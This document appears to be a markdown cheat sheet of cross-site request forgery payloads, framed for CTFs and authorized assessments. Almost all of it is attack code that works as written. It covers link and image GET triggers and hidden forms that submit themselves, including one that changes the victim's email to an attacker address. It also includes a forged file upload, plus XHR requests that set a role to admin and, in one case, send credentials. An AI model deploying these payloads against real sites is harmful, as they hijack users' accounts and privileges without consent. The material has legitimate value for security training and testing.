# Cross-Site Request Forgery (CSRF) Reference Guide

A comprehensive quick-reference guide covering CSRF payloads, HTTP methods, browser interaction requirements, form-based requests, file uploads, XHR requests, and simple versus complex cross-origin requests for CTFs, lab environments, and authorized security assessments.

---

## 1. HTML GET-Based CSRF

### GET - Requiring User Interaction

A basic CSRF payload using an HTML anchor element. The request is triggered when the victim clicks the link.

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">
Click Me
</a>
```

---

### GET - No User Interaction

A GET request can be triggered automatically when the browser attempts to load an external resource.

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

---

## 2. HTML POST-Based CSRF

### POST - Requiring User Interaction

A standard HTML form that submits a POST request when the victim clicks the submit button.

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="CSRFd"/>
<input type="submit" value="Submit Request"/>
</form>
```

---

### POST - Change Email - Requiring User Interaction

A simple CSRF form targeting an email-change endpoint. The victim must click the submit button.

```html
<form
method="POST" action="https://9.8.8.5/challenge/profile.php">
<input type="hidden" name="email" value="attacker@example.com"/>
<input type="submit" value="Change Email"/>
</form>
```
<img width="2704" height="628" alt="image" src="https://github.com/user-attachments/assets/cde9fe4f-4dfd-4159-97cd-ca5d7a7657bc" />
<img width="388" height="236" alt="image" src="https://github.com/user-attachments/assets/09749b91-40fe-4197-9de3-361ddc8fe144" />

---

### POST - Change Email - AutoSubmit

The same state-changing request can be submitted automatically using JavaScript.

```html
<form action="http://10.8.8.5/fchallenge/profile.php" method="POST" id="f">
<input type="hidden" name="email" value="attacker@evil.com"/>
</form>

<script>
document.getElementById("f").submit();
</script>
```

---

### POST - AutoSubmit - No User Interaction

The form is submitted automatically through JavaScript without requiring the victim to click the submit button.

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="CSRFd" />

<input type="submit" value="Submit Request"/>
</form>

<script>
document.getElementById("autosubmit").submit();
</script>
```

---

### POST - multipart/form-data With File Upload

A multipart/form-data CSRF template that creates a client-side `File` object and assigns it to a file input before submitting the form.

```html
<script>
function launch() {
const dT = new DataTransfer();
const file = new File(
["CSRF-filecontent"],
"CSRF-filename"
);

dT.items.add(file);

document.xss[0].files = dT.files;
document.xss.submit();
}
</script>

<form
style="display: none"
name="xss"
method="post"
action="<target>"
enctype="multipart/form-data"
>
<input
id="file"
type="file"
name="file"
/>

<input
type="submit"
name=""
value=""
size="0"
/>
</form>

<button
value="button"
onclick="launch()"
>
Submit Request
</button>
```

---

## 3. JSON GET Requests

### GET - Simple Request

An XMLHttpRequest-based GET request.

```html
<script>
var xhr = new XMLHttpRequest();

xhr.open(
"GET",
"http://www.example.com/api/currentuser"
);

xhr.send();
</script>
```

---

## 4. JSON POST Requests

### POST - Simple Request Using XHR

A POST request using a content type associated with browser simple-request handling.

```html
<script>
var xhr = new XMLHttpRequest();

xhr.open(
"POST",
"http://www.example.com/api/setrole"
);

// application/json is not allowed in a simple request.
// text/plain is used here.

xhr.setRequestHeader(
"Content-Type",
"text/plain"
);

// Other content types that may be relevant:
//
// xhr.setRequestHeader(
// "Content-Type",
// "application/x-www-form-urlencoded"
// );
//
// xhr.setRequestHeader(
// "Content-Type",
// "multipart/form-data"
// );

xhr.send('{"role":admin}');
</script>
```

---

### POST - Simple Request Using AutoSubmit Form

A form-based approach using `text/plain` to construct a request body resembling JSON.

```html
<form
id="CSRF_POC"
action="www.example.com/api/setrole"
enctype="text/plain"
method="POST"
>
<!--
This input will send approximately:
{"role":admin,"other":"="}
-->
<input
type="hidden"
name='{"role":admin, "other":"'
value='"}'
/>
</form>

<script>
document.getElementById("CSRF_POC").submit();
</script>
```

> **Browser Note:** Browser behavior and tracking-protection behavior can vary between browsers and versions.

---

### POST - Complex Request

An XMLHttpRequest using `application/json` and credentials.

```html
<script>
var xhr = new XMLHttpRequest();

xhr.open(
"POST",
"http://www.example.com/api/setrole"
);

xhr.withCredentials = true;

xhr.setRequestHeader(
"Content-Type",
"application/json;charset=UTF-8"
);

xhr.send('{"role":admin}');
</script>
```

---

<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
